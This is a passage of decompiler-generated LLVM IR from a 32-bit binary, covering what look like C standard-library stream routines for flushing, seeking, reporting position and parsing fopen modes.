  uselistorder i32 %v5_80552cc, { 1, 0, 2 }
  uselistorder i32 %v0_80552c4, { 1, 0 }
  uselistorder label %dec_label_pc_80552e4, { 1, 0 }
}

define i32 @function_80552ec(i16* %arg1) local_unnamed_addr {
dec_label_pc_80552ec:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v4_80552f3 = ptrtoint i16* %arg1 to i32
  store i32 %v4_80552f3, i32* @esi, align 4
  %v1_80552f7 = add i32 %v4_80552f3, 52
  %v2_80552f7 = inttoptr i32 %v1_80552f7 to i32*
  %v3_80552f7 = load i32, i32* %v2_80552f7, align 4
  store i32 %v3_80552f7, i32* @ebp, align 4
  %v1_80552fa = icmp eq i32 %v3_80552f7, 0
  %v1_80552fc = icmp eq i1 %v1_80552fa, false
  br i1 %v1_80552fc, label %dec_label_pc_805531d, label %dec_label_pc_80552fe

dec_label_pc_80552fe:                             ; preds = %dec_label_pc_80552ec
  %v1_80552fe = add i32 %v4_80552f3, 56
  store i32 %v1_80552fe, i32* @ebx, align 4
  %v2_8055308 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8055308, i32* @eax, align 4
  %v2_805530d = call i32 @function_80535d2(i32 %v2_8055308, i32 134559183)
  %v0_8055312 = load i32, i32* @ebx, align 4
  %v1_8055315 = call i32 @function_80535cf(i32 %v0_8055312)
  store i32 %v1_8055315, i32* @eax, align 4
  %v0_805531f.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805531d

dec_label_pc_805531d:                             ; preds = %dec_label_pc_80552ec, %dec_label_pc_80552fe
  %v0_8055327 = phi i32 [ %v4_80552f3, %dec_label_pc_80552ec ], [ %v0_805531f.pre, %dec_label_pc_80552fe ]
  store i32 0, i32* @edi, align 4
  %v1_805531f = inttoptr i32 %v0_8055327 to i8*
  %v2_805531f = load i8, i8* %v1_805531f, align 1
  %v3_805531f = and i8 %v2_805531f, 64
  %v4_805531f = icmp eq i8 %v3_805531f, 0
  br i1 %v4_805531f, label %dec_label_pc_805531d.dec_label_pc_8055332_crit_edge, label %dec_label_pc_8055324

dec_label_pc_805531d.dec_label_pc_8055332_crit_edge: ; preds = %dec_label_pc_805531d
  br label %dec_label_pc_8055332

dec_label_pc_8055324:                             ; preds = %dec_label_pc_805531d
  %v1_8055328 = inttoptr i32 %v0_8055327 to i16*
  %v2_8055328 = call i32 @function_8055964(i16* %v1_8055328)
  store i32 %v2_8055328, i32* @edi, align 4
  %v0_8055335.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8055332

dec_label_pc_8055332:                             ; preds = %dec_label_pc_805531d.dec_label_pc_8055332_crit_edge, %dec_label_pc_8055324
  %v0_8055335 = phi i32 [ %v0_8055327, %dec_label_pc_805531d.dec_label_pc_8055332_crit_edge ], [ %v0_8055335.pre, %dec_label_pc_8055324 ]
  %v1_8055335 = add i32 %v0_8055335, 4
  %v2_8055335 = inttoptr i32 %v1_8055335 to i32*
  %v3_8055335 = load i32, i32* %v2_8055335, align 4
  %v1_8055338 = call i32 @function_8050138(i32 %v3_8055335)
  store i32 %v1_8055338, i32* @eax, align 4
  %v2_8055340 = icmp slt i32 %v1_8055338, 0
  %v1_8055342 = icmp eq i1 %v2_8055340, false
  br i1 %v1_8055342, label %dec_label_pc_8055347, label %dec_label_pc_8055344

dec_label_pc_8055344:                             ; preds = %dec_label_pc_8055332
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_8055347

dec_label_pc_8055347:                             ; preds = %dec_label_pc_8055332, %dec_label_pc_8055344
  %v0_8055347 = load i32, i32* @esi, align 4
  %v1_8055347 = add i32 %v0_8055347, 4
  %v2_8055347 = inttoptr i32 %v1_8055347 to i32*
  store i32 -1, i32* %v2_8055347, align 4
  %v2_8055359 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_8055359, i32* @ebx, align 4
  %v2_805535e = call i32 @function_80535d2(i32 %v2_8055359, i32 134559183)
  %v1_805536a = call i32 @function_80535cf(i32 ptrtoint (i32* @global_var_805d658.308 to i32))
  %v0_805536f = load i32, i32* @global_var_80618e4.409, align 4
  %v1_8055374 = add i32 %v0_805536f, 1
  store i32 %v1_8055374, i32* @global_var_80618e4.409, align 4
  store i32 ptrtoint (i32* @global_var_805d658.308 to i32), i32* @eax, align 4
  %v2_805537f = call i32 @function_80535d2(i32 %v2_8055359, i32 1)
  store i32 %v2_805537f, i32* @eax, align 4
  %v0_8055387 = load i32, i32* @esi, align 4
  %v1_8055387 = inttoptr i32 %v0_8055387 to i16*
  %v2_8055387 = load i16, i16* %v1_8055387, align 2
  %v3_8055387 = and i16 %v2_8055387, 24576
  store i16 %v3_8055387, i16* %v1_8055387, align 2
  %v0_805538c = load i32, i32* @esi, align 4
  %v1_805538c = inttoptr i32 %v0_805538c to i16*
  %v2_805538c = load i16, i16* %v1_805538c, align 2
  %v3_805538c = or i16 %v2_805538c, 48
  store i16 %v3_805538c, i16* %v1_805538c, align 2
  br i1 %v1_80552fc, label %dec_label_pc_80553a5, label %dec_label_pc_8055394

dec_label_pc_8055394:                             ; preds = %dec_label_pc_8055347
  %v2_8055398 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8055398, i32* @eax, align 4
  %v2_805539d = call i32 @function_80535d2(i32 %v2_8055398, i32 1)
  store i32 %v2_805539d, i32* @eax, align 4
  br label %dec_label_pc_80553a5

dec_label_pc_80553a5:                             ; preds = %dec_label_pc_8055347, %dec_label_pc_8055394
  %v0_80553a5 = load i32, i32* @esi, align 4
  %v1_80553a5 = add i32 %v0_80553a5, 1
  %v2_80553a5 = inttoptr i32 %v1_80553a5 to i8*
  %v3_80553a5 = load i8, i8* %v2_80553a5, align 1
  %v4_80553a5 = and i8 %v3_80553a5, 64
  %v5_80553a5 = icmp eq i8 %v4_80553a5, 0
  br i1 %v5_80553a5, label %dec_label_pc_80553b9, label %dec_label_pc_80553ab

dec_label_pc_80553ab:                             ; preds = %dec_label_pc_80553a5
  %v1_80553ae = add i32 %v0_80553a5, 8
  %v2_80553ae = inttoptr i32 %v1_80553ae to i32*
  %v3_80553ae = load i32, i32* %v2_80553ae, align 4
  %v1_80553b1 = call i32 @function_8052915(i32 %v3_80553ae)
  store i32 %v1_80553b1, i32* @eax, align 4
  br label %dec_label_pc_80553b9

dec_label_pc_80553b9:                             ; preds = %dec_label_pc_80553a5, %dec_label_pc_80553ab
  %v2_80553c5 = call i32 @function_80535d2(i32 %v2_8055359, i32 134559183)
  %v1_80553d1 = call i32 @function_80535cf(i32 ptrtoint (i32* @global_var_805d658.308 to i32))
  store i32 ptrtoint (i32* @global_var_805d658.308 to i32), i32* @eax, align 4
  %v0_80553d8 = load i32, i32* @global_var_80618e8.410, align 8
  %v1_80553d8 = add i32 %v0_80553d8, 1
  store i32 %v1_80553d8, i32* @global_var_80618e8.410, align 8
  %v2_80553e1 = call i32 @function_80535d2(i32 %v2_8055359, i32 1)
  %v0_80553e6 = call i32 @function_8055880()
  %v0_80553ee = load i32, i32* @edi, align 4
  ret i32 %v0_80553ee

; uselistorder directives
  uselistorder i32 (i32)* @function_8050138, { 10, 2, 1, 0, 17, 16, 15, 14, 9, 8, 7, 6, 5, 4, 3, 13, 12, 11 }
  uselistorder label %dec_label_pc_80553b9, { 1, 0 }
  uselistorder label %dec_label_pc_80553a5, { 1, 0 }
  uselistorder label %dec_label_pc_8055347, { 1, 0 }
  uselistorder label %dec_label_pc_8055332, { 1, 0 }
  uselistorder label %dec_label_pc_805531d, { 1, 0 }
}

define i32 @function_80553f8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80553f8:
  %v4_8055407 = inttoptr i32 %arg2 to i8*
  %v5_8055407 = call i32 @function_80555b8(i32 %arg1, i8* %v4_8055407, i32 0, i32 -1)
  ret i32 %v5_8055407
}

define i32 @function_8055410(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8055410:
  %v1_805541b = ashr i32 %arg2, 31
  %v4_8055422 = inttoptr i32 %arg1 to i16*
  %v5_8055422 = call i32 @function_805542c(i16* %v4_8055422, i32 %arg2, i32 %v1_805541b, i32 %arg3)
  ret i32 %v5_8055422
}

define i32 @function_805542c(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805542c:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_805542c = load i32, i32* @ebp, align 4
  %v0_805542d = load i32, i32* @edi, align 4
  %v0_805542e = load i32, i32* @esi, align 4
  %v0_805542f = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @edi, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* @edx, align 4
  %v4_805543f = ptrtoint i16* %arg1 to i32
  store i32 %v4_805543f, i32* @esi, align 4
  store i32 %arg2, i32* %stack_var_-28, align 4
  %tmp27 = icmp ult i32 %arg4, 3
  br i1 %tmp27, label %dec_label_pc_8055463, label %dec_label_pc_8055450

dec_label_pc_8055450:                             ; preds = %dec_label_pc_805542c
  %v1_8055450 = call i32 @function_8050568(i32 %arg2)
  store i32 %v1_8055450, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v1_8055458 = inttoptr i32 %v1_8055450 to i32*
  store i32 22, i32* %v1_8055458, align 4
  br label %dec_label_pc_8055505

dec_label_pc_8055463:                             ; preds = %dec_label_pc_805542c
  %v1_8055463 = add i32 %v4_805543f, 52
  %v2_8055463 = inttoptr i32 %v1_8055463 to i32*
  %v3_8055463 = load i32, i32* %v2_8055463, align 4
  %v1_8055466 = icmp eq i32 %v3_8055463, 0
  %v1_8055468 = icmp eq i1 %v1_8055466, false
  br i1 %v1_8055468, label %dec_label_pc_8055489, label %dec_label_pc_805546a

dec_label_pc_805546a:                             ; preds = %dec_label_pc_8055463
  %v1_805546a = add i32 %v4_805543f, 56
  store i32 %v1_805546a, i32* @ebx, align 4
  %v2_8055474 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8055474, i32* @eax, align 4
  %v3_8055479 = call i32 @function_80535d2(i32 %v2_8055474, i32 134559183)
  store i32 %v3_8055479, i32* %eax.global-to-local, align 4
  %v0_805547e = load i32, i32* @ebx, align 4
  %v2_8055481 = call i32 @function_80535cf(i32 %v0_805547e)
  store i32 %v2_8055481, i32* %eax.global-to-local, align 4
  %v0_8055489.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8055489

dec_label_pc_8055489:                             ; preds = %dec_label_pc_8055463, %dec_label_pc_805546a
  %v0_8055491 = phi i32 [ %v4_805543f, %dec_label_pc_8055463 ], [ %v0_8055489.pre, %dec_label_pc_805546a ]
  %v1_8055489 = inttoptr i32 %v0_8055491 to i8*
  %v2_8055489 = load i8, i8* %v1_8055489, align 1
  %v3_8055489 = and i8 %v2_8055489, 64
  %v4_8055489 = icmp eq i8 %v3_8055489, 0
  br i1 %v4_8055489, label %dec_label_pc_805549e, label %dec_label_pc_805548e

dec_label_pc_805548e:                             ; preds = %dec_label_pc_8055489
  %v2_8055492 = call i32 @function_8050744(i32 %v0_8055491)
  store i32 %v2_8055492, i32* %eax.global-to-local, align 4
  %v1_805549a = icmp eq i32 %v2_8055492, 0
  %v1_805549c = icmp eq i1 %v1_805549a, false
  br i1 %v1_805549c, label %dec_label_pc_80554ed, label %dec_label_pc_805549e

dec_label_pc_805549e:                             ; preds = %dec_label_pc_805548e, %dec_label_pc_8055489
  %v0_805549e = load i32, i32* @edi, align 4
  %v9_805549e = icmp eq i32 %v0_805549e, 1
  %v1_80554a1 = icmp eq i1 %v9_805549e, false
  br i1 %v1_80554a1, label %dec_label_pc_805549e.dec_label_pc_80554b7_crit_edge, label %dec_label_pc_80554a3

dec_label_pc_805549e.dec_label_pc_80554b7_crit_edge: ; preds = %dec_label_pc_805549e
  %.pre5 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_80554b7

dec_label_pc_80554a3:                             ; preds = %dec_label_pc_805549e
  %v0_80554a3 = load i32, i32* @ecx, align 4
  %v2_80554a5 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_80554a5, i32* %eax.global-to-local, align 4
  %v0_80554aa = load i32, i32* @esi, align 4
  %tmp25 = inttoptr i32 %v0_80554aa to i32*
  %v6_80554ab = call i32 @function_8055510(i32* %tmp25, i32 %v2_80554a5, i32 %v0_80554a3, i32 %v0_80554a3)
  store i32 %v6_80554ab, i32* %eax.global-to-local, align 4
  %v2_80554b3 = icmp slt i32 %v6_80554ab, 0
  br i1 %v2_80554b3, label %dec_label_pc_80554ed, label %dec_label_pc_80554a3.dec_label_pc_80554b7_crit_edge

dec_label_pc_80554a3.dec_label_pc_80554b7_crit_edge: ; preds = %dec_label_pc_80554a3
  %v0_80554b8.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80554b7

dec_label_pc_80554b7:                             ; preds = %dec_label_pc_805549e.dec_label_pc_80554b7_crit_edge, %dec_label_pc_80554a3.dec_label_pc_80554b7_crit_edge
  %v2_80554b9.pre-phi = phi i32 [ %.pre5, %dec_label_pc_805549e.dec_label_pc_80554b7_crit_edge ], [ %v2_80554a5, %dec_label_pc_80554a3.dec_label_pc_80554b7_crit_edge ]
  %v0_80554b8 = phi i32 [ %v0_805549e, %dec_label_pc_805549e.dec_label_pc_80554b7_crit_edge ], [ %v0_80554b8.pre, %dec_label_pc_80554a3.dec_label_pc_80554b7_crit_edge ]
  %v0_80554b7 = load i32, i32* @edx, align 4
  store i32 %v2_80554b9.pre-phi, i32* %eax.global-to-local, align 4
  %v0_80554be = load i32, i32* @esi, align 4
  %v5_80554bf = inttoptr i32 %v2_80554b9.pre-phi to i32*
  %v6_80554bf = call i32 @function_80557e8(i32 %v0_80554be, i32* %v5_80554bf, i32 %v0_80554b8, i32 %v0_80554b7)
  store i32 %v6_80554bf, i32* %eax.global-to-local, align 4
  %v2_80554c7 = icmp slt i32 %v6_80554bf, 0
  br i1 %v2_80554c7, label %dec_label_pc_80554ed, label %dec_label_pc_80554cb

dec_label_pc_80554cb:                             ; preds = %dec_label_pc_80554b7
  %v0_80554cb = load i32, i32* @esi, align 4
  %v1_80554cb = inttoptr i32 %v0_80554cb to i16*
  %v2_80554cb = load i16, i16* %v1_80554cb, align 2
  %v3_80554cb = and i16 %v2_80554cb, -72
  store i16 %v3_80554cb, i16* %v1_80554cb, align 2
  %v0_80554cf = load i32, i32* @esi, align 4
  %v1_80554cf = add i32 %v0_80554cf, 8
  %v2_80554cf = inttoptr i32 %v1_80554cf to i32*
  %v3_80554cf = load i32, i32* %v2_80554cf, align 4
  store i32 %v3_80554cf, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v2_80554d4 = add i32 %v0_80554cf, 16
  %v3_80554d4 = inttoptr i32 %v2_80554d4 to i32*
  store i32 %v3_80554cf, i32* %v3_80554d4, align 4
  %v0_80554d7 = load i32, i32* %eax.global-to-local, align 4
  %v1_80554d7 = load i32, i32* @esi, align 4
  %v2_80554d7 = add i32 %v1_80554d7, 20
  %v3_80554d7 = inttoptr i32 %v2_80554d7 to i32*
  store i32 %v0_80554d7, i32* %v3_80554d7, align 4
  %v0_80554da = load i32, i32* %eax.global-to-local, align 4
  %v1_80554da = load i32, i32* @esi, align 4
  %v2_80554da = add i32 %v1_80554da, 24
  %v3_80554da = inttoptr i32 %v2_80554da to i32*
  store i32 %v0_80554da, i32* %v3_80554da, align 4
  %v0_80554dd = load i32, i32* %eax.global-to-local, align 4
  %v1_80554dd = load i32, i32* @esi, align 4
  %v2_80554dd = add i32 %v1_80554dd, 28
  %v3_80554dd = inttoptr i32 %v2_80554dd to i32*
  store i32 %v0_80554dd, i32* %v3_80554dd, align 4
  %v0_80554e0 = load i32, i32* @esi, align 4
  %v1_80554e0 = add i32 %v0_80554e0, 44
  %v2_80554e0 = inttoptr i32 %v1_80554e0 to i32*
  store i32 0, i32* %v2_80554e0, align 4
  %v0_80554e7 = load i32, i32* @esi, align 4
  %v1_80554e7 = add i32 %v0_80554e7, 2
  %v2_80554e7 = inttoptr i32 %v1_80554e7 to i8*
  store i8 0, i8* %v2_80554e7, align 1
  br label %dec_label_pc_80554f0

dec_label_pc_80554ed:                             ; preds = %dec_label_pc_80554b7, %dec_label_pc_80554a3, %dec_label_pc_805548e
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80554f0

dec_label_pc_80554f0:                             ; preds = %dec_label_pc_80554cb, %dec_label_pc_80554ed
  br i1 %v1_8055468, label %dec_label_pc_8055505, label %dec_label_pc_80554f4

dec_label_pc_80554f4:                             ; preds = %dec_label_pc_80554f0
  %v2_80554f8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_80554f8, i32* @eax, align 4
  %v3_80554fd = call i32 @function_80535d2(i32 %v2_80554f8, i32 1)
  store i32 %v3_80554fd, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055505

dec_label_pc_8055505:                             ; preds = %dec_label_pc_80554f0, %dec_label_pc_8055450, %dec_label_pc_80554f4
  %v0_8055508 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8055508, i32* %eax.global-to-local, align 4
  store i32 %v0_805542f, i32* @ebx, align 4
  store i32 %v0_805542e, i32* @esi, align 4
  store i32 %v0_805542d, i32* @edi, align 4
  store i32 %v0_805542c, i32* @ebp, align 4
  ret i32 %v0_8055508

; uselistorder directives
  uselistorder i32 %v2_80554b9.pre-phi, { 1, 0 }
  uselistorder i32 %v0_805549e, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8055505, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80554f0, { 1, 0 }
  uselistorder label %dec_label_pc_80554b7, { 1, 0 }
  uselistorder label %dec_label_pc_8055489, { 1, 0 }
}

define i32 @function_8055510(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8055510:
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = ptrtoint i32* %arg1 to i32
  store i32 %tmp6, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %edi.global-to-local, align 4
  %v2_8055520 = load i32, i32* %arg1, align 4
  store i32 %v2_8055520, i32* %esi.global-to-local, align 4
  %v1_8055527 = urem i32 %v2_8055520, 4
  %v2_8055527 = icmp eq i32 %v1_8055527, 0
  store i32 %v1_8055527, i32* %ecx.global-to-local, align 4
  br i1 %v2_8055527, label %dec_label_pc_8055556, label %dec_label_pc_805552c

dec_label_pc_805552c:                             ; preds = %dec_label_pc_8055510
  %v1_805552e = add nsw i32 %v1_8055527, -1
  %v8_805552e = icmp eq i32 %v1_805552e, 0
  store i32 %v1_805552e, i32* @edx, align 4
  br i1 %v8_805552e, label %dec_label_pc_8055556, label %dec_label_pc_8055531

dec_label_pc_8055531:                             ; preds = %dec_label_pc_805552c
  %v3_8055531 = and i32 %v2_8055520, 2048
  %v4_8055531 = icmp eq i32 %v3_8055531, 0
  br i1 %v4_8055531, label %dec_label_pc_8055556, label %dec_label_pc_8055536

dec_label_pc_8055536:                             ; preds = %dec_label_pc_8055531
  %v6_8055536 = sub nsw i32 1, %v1_8055527
  %v7_8055536 = and i32 %v1_805552e, %v6_8055536
  %v8_8055536 = icmp slt i32 %v7_8055536, 0
  %v9_8055536 = icmp eq i32 %v1_8055527, 2
  %v10_8055536 = icmp ult i32 %v1_8055527, 2
  %v3_8055539 = icmp eq i1 %v10_8055536, %v8_8055536
  %v4_8055539 = icmp eq i1 %v9_8055536, false
  %v5_8055539 = and i1 %v4_8055539, %v3_8055539
  br i1 %v5_8055539, label %dec_label_pc_80555ac, label %dec_label_pc_805553b

dec_label_pc_805553b:                             ; preds = %dec_label_pc_8055536
  %v1_805553b = add i32 %tmp6, 40
  %v2_805553b = inttoptr i32 %v1_805553b to i32*
  %v3_805553b = load i32, i32* %v2_805553b, align 4
  %v4_805553b = icmp eq i32 %v3_805553b, 0
  %v1_805553f = icmp eq i1 %v4_805553b, false
  br i1 %v1_805553f, label %dec_label_pc_80555ac, label %dec_label_pc_8055541

dec_label_pc_8055541:                             ; preds = %dec_label_pc_805553b
  %v1_8055541 = add i32 %tmp6, 3
  %v2_8055541 = inttoptr i32 %v1_8055541 to i8*
  %v3_8055541 = load i8, i8* %v2_8055541, align 1
  %v4_8055541 = zext i8 %v3_8055541 to i32
  %v2_8055545 = sub nsw i32 %v1_805552e, %v4_8055541
  %v1_8055547 = add i32 %tmp6, 44
  %v2_8055547 = inttoptr i32 %v1_8055547 to i32*
  %v3_8055547 = load i32, i32* %v2_8055547, align 4
  %v1_805554b = add nsw i32 %v2_8055545, -1
  %tmp12 = icmp slt i32 %v3_8055547, 1
  br i1 %tmp12, label %dec_label_pc_8055556, label %dec_label_pc_8055550

dec_label_pc_8055550:                             ; preds = %dec_label_pc_8055541
  %v1_8055550 = add i32 %tmp6, 2
  %v2_8055550 = inttoptr i32 %v1_8055550 to i8*
  %v3_8055550 = load i8, i8* %v2_8055550, align 1
  %v4_8055550 = zext i8 %v3_8055550 to i32
  %v2_8055554 = sub nsw i32 %v1_805554b, %v4_8055550
  br label %dec_label_pc_8055556

dec_label_pc_8055556:                             ; preds = %dec_label_pc_8055541, %dec_label_pc_8055531, %dec_label_pc_805552c, %dec_label_pc_8055510, %dec_label_pc_8055550
  %v0_805556d = phi i32 [ %v1_805554b, %dec_label_pc_8055541 ], [ %v1_805552e, %dec_label_pc_8055531 ], [ 0, %dec_label_pc_805552c ], [ 0, %dec_label_pc_8055510 ], [ %v2_8055554, %dec_label_pc_8055550 ]
  %v2_8055556 = and i32 %v2_8055520, 64
  %v3_8055556 = icmp eq i32 %v2_8055556, 0
  %storemerge.in.in.v = select i1 %v3_8055556, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp6
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_8055565 = add i32 %tmp6, 16
  %v3_8055565 = inttoptr i32 %v2_8055565 to i32*
  %v4_8055565 = load i32, i32* %v3_8055565, align 4
  %v5_8055565 = sub i32 %storemerge, %v4_8055565
  %v1_8055568 = inttoptr i32 %arg2 to i32*
  %v2_8055568 = load i32, i32* %v1_8055568, align 4
  store i32 %v2_8055568, i32* %ecx.global-to-local, align 4
  %v1_805556a = add i32 %arg2, 4
  %v2_805556a = inttoptr i32 %v1_805556a to i32*
  %v3_805556a = load i32, i32* %v2_805556a, align 4
  store i32 %v3_805556a, i32* %ebx.global-to-local, align 4
  %v2_805556d = add i32 %v5_8055565, %v0_805556d
  store i32 %v2_805556d, i32* %esi.global-to-local, align 4
  %v2_8055578 = ashr i32 %v2_805556d, 31
  %v5_8055581 = sub i32 %v2_8055568, %v2_805556d
  %v10_8055581 = icmp ult i32 %v2_8055568, %v2_805556d
  %v6_8055585 = zext i1 %v10_8055581 to i32
  %tmp = icmp slt i32 %v2_805556d, 0
  %v2_8055578.neg = zext i1 %tmp to i32
  %v7_8055585 = add i32 %v3_805556a, %v2_8055578.neg
  %v8_8055585 = add i32 %v7_8055585, %v6_8055585
  store i32 %v8_8055585, i32* @edx, align 4
  store i32 %v5_8055581, i32* %v1_8055568, align 4
  %v0_805558b = load i32, i32* @edx, align 4
  %v1_805558b = load i32, i32* %edi.global-to-local, align 4
  %v2_805558b = add i32 %v1_805558b, 4
  %v3_805558b = inttoptr i32 %v2_805558b to i32*
  store i32 %v0_805558b, i32* %v3_805558b, align 4
  %v0_805558e = load i32, i32* %edi.global-to-local, align 4
  %v1_805558e = add i32 %v0_805558e, 4
  %v2_805558e = inttoptr i32 %v1_805558e to i32*
  %v3_805558e = load i32, i32* %v2_805558e, align 4
  %v4_805558e = load i32, i32* %ebx.global-to-local, align 4
  %v5_8055591 = icmp slt i32 %v3_805558e, %v4_805558e
  br i1 %v5_8055591, label %dec_label_pc_805559b, label %dec_label_pc_8055593

dec_label_pc_8055593:                             ; preds = %dec_label_pc_8055556
  %v8_8055593 = icmp sgt i32 %v3_805558e, %v4_805558e
  br i1 %v8_8055593, label %dec_label_pc_8055599, label %dec_label_pc_8055595

dec_label_pc_8055595:                             ; preds = %dec_label_pc_8055593
  %v1_8055595 = inttoptr i32 %v0_805558e to i32*
  %v2_8055595 = load i32, i32* %v1_8055595, align 4
  %v3_8055595 = load i32, i32* %ecx.global-to-local, align 4
  %tmp14 = icmp ugt i32 %v2_8055595, %v3_8055595
  br i1 %tmp14, label %dec_label_pc_8055599, label %dec_label_pc_805559b

dec_label_pc_8055599:                             ; preds = %dec_label_pc_8055595, %dec_label_pc_8055593
  %v0_8055599 = load i32, i32* %esi.global-to-local, align 4
  %v1_8055599 = sub i32 0, %v0_8055599
  store i32 %v1_8055599, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805559b

dec_label_pc_805559b:                             ; preds = %dec_label_pc_8055595, %dec_label_pc_8055556, %dec_label_pc_8055599
  %v0_805559b = load i32, i32* %esi.global-to-local, align 4
  %v2_805559b = icmp slt i32 %v0_805559b, 0
  %v1_805559d = icmp eq i1 %v2_805559b, false
  br i1 %v1_805559d, label %dec_label_pc_80555af, label %dec_label_pc_805559f

dec_label_pc_805559f:                             ; preds = %dec_label_pc_805559b
  %v1_805559f = call i32 @function_8050568(i32 %v2_8055578)
  %v1_80555a4 = inttoptr i32 %v1_805559f to i32*
  store i32 75, i32* %v1_80555a4, align 4
  %v0_80555b2.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80555af

dec_label_pc_80555ac:                             ; preds = %dec_label_pc_805553b, %dec_label_pc_8055536
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80555af

dec_label_pc_80555af:                             ; preds = %dec_label_pc_805559b, %dec_label_pc_805559f, %dec_label_pc_80555ac
  %v0_80555b2 = phi i32 [ %v0_805559b, %dec_label_pc_805559b ], [ %v0_80555b2.pre, %dec_label_pc_805559f ], [ -1, %dec_label_pc_80555ac ]
  ret i32 %v0_80555b2

; uselistorder directives
  uselistorder i32 %v4_805558e, { 1, 0 }
  uselistorder i32 %v3_805558e, { 1, 0 }
  uselistorder i32 %v1_805552e, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v1_8055527, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 %v2_8055520, { 2, 1, 0, 3 }
  uselistorder i32 %tmp6, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %esi.global-to-local, { 0, 4, 2, 1, 3, 5, 6 }
  uselistorder i32 75, { 2, 1, 0 }
  uselistorder i32 2048, { 2, 1, 6, 3, 5, 0, 8, 4, 7 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80555af, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805559b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055556, { 4, 0, 1, 2, 3 }
}

define i32 @function_80555b8(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80555b8:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80555b8 = load i32, i32* @ebp, align 4
  %v0_80555b9 = load i32, i32* @edi, align 4
  %v0_80555ba = load i32, i32* @esi, align 4
  %v0_80555bb = load i32, i32* @ebx, align 4
  store i32 %v0_80555bb, i32* %stack_var_-16, align 4
  %v4_80555bf = ptrtoint i8* %arg2 to i32
  store i32 %v4_80555bf, i32* @edx, align 4
  store i32 %arg1, i32* @esi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %v2_80555cf = load i8, i8* %arg2, align 1
  %v3_80555cf = zext i8 %v2_80555cf to i32
  %v4_80555cf = load i32, i32* @eax, align 4
  %v5_80555cf = and i32 %v4_80555cf, -256
  %v6_80555cf = or i32 %v5_80555cf, %v3_80555cf
  store i32 %v6_80555cf, i32* %eax.global-to-local, align 4
  %v10_80555d1 = icmp eq i8 %v2_80555cf, 114
  br i1 %v10_80555d1, label %dec_label_pc_8055613, label %dec_label_pc_80555d5

dec_label_pc_80555d5:                             ; preds = %dec_label_pc_80555b8
  store i32 577, i32* @ebx, align 4
  %v10_80555da = icmp eq i8 %v2_80555cf, 119
  br i1 %v10_80555da, label %dec_label_pc_8055615, label %dec_label_pc_80555de

dec_label_pc_80555de:                             ; preds = %dec_label_pc_80555d5
  store i32 1089, i32* @ebx, align 4
  %v10_80555e2 = icmp eq i8 %v2_80555cf, 97
  br i1 %v10_80555e2, label %dec_label_pc_8055615, label %dec_label_pc_80555e6

dec_label_pc_80555e6:                             ; preds = %dec_label_pc_805568e, %dec_label_pc_8055668, %dec_label_pc_80555de
  %v0_80555e6 = load i32, i32* %stack_var_-16, align 4
  %v1_80555e6 = call i32 @function_8050568(i32 %v0_80555e6)
  store i32 %v1_80555e6, i32* %eax.global-to-local, align 4
  %v0_80555eb = load i32, i32* @ebp, align 4
  %v1_80555eb = icmp eq i32 %v0_80555eb, 0
  %v1_80555ed = inttoptr i32 %v1_80555e6 to i32*
  store i32 22, i32* %v1_80555ed, align 4
